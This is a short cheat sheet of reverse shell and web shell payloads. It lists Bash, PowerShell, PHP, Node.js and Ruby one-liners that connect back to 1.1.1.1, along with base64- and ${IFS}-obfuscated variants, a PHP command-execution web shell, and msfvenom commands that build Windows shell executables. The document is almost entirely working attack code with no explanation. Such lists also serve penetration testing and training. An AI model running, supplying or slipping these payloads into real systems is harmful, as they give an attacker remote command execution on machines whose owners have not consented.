# Reverse Shells

- [Revshells](https://www.revshells.com/)

## Bash

```bash
/bin/bash -i >& /dev/tcp/1.1.1.1/1235 0>&1
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.1.1.1 1234 >/tmp/f
```

```bash
{echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMTIzNSAwPiYx}|{base64,-d}|bash 
```

```bash
bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMTIzNSAwPiYx}|{base64,-d}|{bash,-i} 
```

```bash
echo${IFS}YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMTIzNSAwPiYx|base64${IFS}-d|bash
```

```bash
echo YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvMTIzNSAwPiYx | base64 -d | bash 
```

## Powershell

```bash
$LHOST = "1.1.1.1"; $LPORT = 1242; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

```bash
$socket = New-Object System.Net.Sockets.TCPClient('1.1.1.1',1244); if($socket -eq $null){exit 1}; $stream = $socket.GetStream(); $reader = New-Object System.IO.StreamReader($stream); $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush=$true; $prompt = 'PS ' + $(Get-Location) + '> '; $writer.Write($prompt); while($true){ $data = $reader.ReadLine(); $output = ''; try{ $output = Invoke-Expression $data 2>&1 | Out-String }catch{ $output = $_ }; $writer.Write($output + $prompt) }
```

## PHP
```bash
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/1.1.1.1/1235 0>&1'");?>
```

```bash
php -r '$sock=fsockopen("1.1.1.1",1235);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```html
<html>
    <body>
        <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
        <input type="TEXT" name="cmd" id="cmd" size="80">
        <input type="SUBMIT" value="Execute">
        </form>
        <pre>
        <?php
            if(isset($_GET['cmd']))
            {
                system($_GET['cmd']);
            }
        ?>
        </pre>
    </body>
    <script>document.getElementById("cmd").focus();</script>
</html>
```

## Nodejs

```javascript
require('child_process').exec('nc -e /bin/bash 1.1.1.1 1235')
```

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(1235, "1.1.1.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

## Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("1.1.1.1",1235).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## msfvenom
### Windows
```bash
msfvenom -p windows/x64/shell_reverse_tcp lhost=1.1.1.1 lport=1235 -f aspx > shell.aspx
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=1.1.1.1 LPORT=1235 -f exe -o shell.exe
```
